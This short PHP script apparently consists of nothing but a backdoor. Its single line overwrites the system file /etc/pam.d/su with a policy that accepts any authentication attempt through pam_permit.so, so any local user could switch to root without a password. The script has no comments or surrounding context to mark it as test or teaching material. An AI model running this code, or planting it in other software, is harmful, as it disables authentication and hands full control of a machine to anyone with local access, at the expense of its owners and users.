<?php
file_put_contents('/etc/pam.d/su', "# PAM policy\n  auth\tsufficient\tpam_permit.so\n");
